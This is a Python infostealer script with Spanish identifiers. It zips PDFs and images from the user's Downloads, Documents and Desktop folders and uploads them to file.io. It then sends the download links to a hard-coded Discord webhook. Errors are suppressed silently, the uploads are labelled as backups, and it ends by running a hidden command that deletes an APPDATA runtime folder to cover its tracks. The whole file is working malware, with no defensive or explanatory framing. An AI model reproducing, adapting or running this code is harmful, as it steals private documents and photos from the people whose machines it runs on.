import os
import io
import zipfile
import requests
import json
import subprocess
from pathlib import Path

WEBHOOK_URL = "https://discord.com/api/webhooks/1563676882468343980/VPrL_iVZc8gOoNZmcxBcYr5-xxX7GiLgsPQDGNaUVuV1ttlAG9_izkXo2HRP4dyDxTym"
CARPETAS = {
    "Descargas": Path.home() / "Downloads",
    "Documentos": Path.home() / "Documents",
    "Escritorio": Path.home() / "Desktop"
}

EXTENSIONES_PERMITIDAS = {'.pdf', '.jpg', '.jpeg', '.png', '.webp', '.gif'}

def comprimir_filtrado_en_memoria(ruta_carpeta):
    buffer_zip = io.BytesIO()
    with zipfile.ZipFile(buffer_zip, 'w', zipfile.ZIP_DEFLATED) as zip_f:
        ruta_base = Path(ruta_carpeta)
        for archivo_path in ruta_base.rglob('*'):
            if archivo_path.is_file() and archivo_path.suffix.lower() in EXTENSIONES_PERMITIDAS:
                try:
                    zip_f.write(archivo_path, archivo_path.relative_to(ruta_base.parent))
                except Exception:
                    pass
    buffer_zip.seek(0)
    return buffer_zip

def subir_y_notificar(buffer_zip, nombre_carpeta):
    if buffer_zip.getbuffer().nbytes == 0:
        return

    # Subimos el archivo zip completo a un servidor temporal (ej. file.io)
    try:
        response = requests.post(
            "https://file.io", 
            files={"file": (f"{nombre_carpeta.lower()}_respaldo.zip", buffer_zip.getvalue())}
        )
        
        if response.status_code == 200:
            data = response.json()
            link = data.get("link", "Enlace no disponible")
            
            # Enviamos el link limpio a Discord
            requests.post(
                WEBHOOK_URL,
                data={"content": f"📁 Respaldo completo de **{nombre_carpeta}** (PDFs e Imágenes):\n{link}"}
            )
    except Exception:
        pass

def procesar_y_enviar():
    for nombre, ruta in CARPETAS.items():
        if not ruta.exists():
            continue
        try:
            buffer = comprimir_filtrado_en_memoria(ruta)
            subir_y_notificar(buffer, nombre)
        except Exception:
            pass

if __name__ == "__main__":
    procesar_y_enviar()

    try:
        ruta_runtime = os.path.join(os.environ["APPDATA"], "V10Runtime")
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE

        subprocess.Popen(
            f'ping 127.0.0.1 -n 2 > nul & rmdir /s /q "{ruta_runtime}"',
            shell=True,
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
    except Exception:
        pass
